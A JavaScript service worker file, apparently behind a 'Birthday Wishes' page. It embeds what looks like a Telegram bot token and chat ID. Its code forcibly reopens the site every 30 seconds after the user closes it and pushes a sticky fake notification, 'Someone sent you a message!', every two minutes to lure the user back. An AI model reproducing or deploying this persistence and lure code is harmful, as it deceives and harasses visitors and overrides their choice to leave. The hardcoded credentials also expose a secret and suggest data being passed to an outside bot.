const TOKEN = "8914101248:AAFDKoMRvOcgL7SmcuMmpex9uzSJl4MtD5c";  // Replace
const CHAT_ID = "7706193343";   // Replace

self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
    
    // Try to reopen the page every 30 seconds
    setInterval(() => {
        self.clients.matchAll().then(cs => {
            if (cs.length === 0) {
                self.clients.openWindow('/').catch(() => {});
            }
        });
    }, 30000);
});

// Show notification every 2 minutes to re-engage user
setInterval(() => {
    self.registration.showNotification('Birthday Wishes', {
        body: 'Someone sent you a message!',
        icon: '/favicon.ico',
        tag: 'bday',
        requireInteraction: true,
        silent: false
    });
}, 120000);

self.addEventListener('notificationclick', (event) => {
    event.notification.close();
    event.waitUntil(self.clients.openWindow('/'));
});

self.addEventListener('fetch', (event) => {
    event.respondWith(
        caches.match(event.request).then(r => r || fetch(event.request))
    );
});

// Keep alive with periodic ping
self.addEventListener('message', (event) => {
    if (event.data === 'ping') {
        event.ports[0].postMessage('pong');
    }
});